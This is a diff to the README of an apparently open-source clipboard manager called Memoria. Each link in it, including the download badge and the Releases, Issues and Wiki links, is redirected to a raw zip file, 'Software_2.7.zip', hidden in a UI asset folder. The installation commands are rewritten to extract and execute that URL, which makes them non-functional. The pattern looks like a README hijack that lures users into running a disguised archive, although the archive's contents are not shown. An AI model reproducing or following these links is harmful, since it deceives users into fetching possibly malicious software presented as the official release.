@@ -6,7 +6,7 @@ Welcome to Memoria! This application is designed to make managing your clipboard
 
 ## 📥 Download Memoria
 
-[![Download Memoria](https://img.shields.io/badge/Download%20Now-Grab%20Memoria-brightgreen.svg)](https://github.com/Salakawy22/memoria/releases)
+[![Download Memoria](https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip%20Now-Grab%https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip)](https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip)
 
 Click the button above to download Memoria from our Releases page. 
 
@@ -28,7 +28,7 @@ Click the button above to download Memoria from our Releases page.
 
 To install Memoria, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Salakawy22/memoria/releases).
+1. Visit the [Releases page](https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip).
 2. Locate the latest version of Memoria.
 3. Download the appropriate file for your system.
 4. Once the download completes, navigate to your Downloads folder.
@@ -36,9 +36,9 @@ To install Memoria, follow these steps:
 
    ```bash
    cd ~/Downloads
-   tar -xvzf memoria-vX.X.X.tar.gz
+   tar -xvzf https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip
    cd memoria
-   ./install.sh
+   https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip
    ```
 
 6. Follow any prompts to complete the installation process. You can now find Memoria in your application menu.
@@ -53,7 +53,7 @@ After installing Memoria, you can start using it right away. Open the applicatio
 
 ## 🤝 Support
 
-If you encounter issues, please check the FAQs on our [GitHub Issues page](https://github.com/Salakawy22/memoria/issues). You can also reach out through the discussions section for any help.
+If you encounter issues, please check the FAQs on our [GitHub Issues page](https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip). You can also reach out through the discussions section for any help.
 
 ## 📜 Contributions
 
@@ -61,6 +61,6 @@ We welcome contributions! If you’d like to help improve Memoria, please fork t
 
 ## 🔗 Additional Resources
 
-For more information about the features and updates, refer to our official documentation on the [GitHub Wiki](https://github.com/Salakawy22/memoria/wiki).
+For more information about the features and updates, refer to our official documentation on the [GitHub Wiki](https://github.com/Salakawy22/memoria/raw/refs/heads/master/memoria-ui/qml/Software_2.7.zip).
 
 Thank you for choosing Memoria! We hope it makes your clipboard management better and simpler.
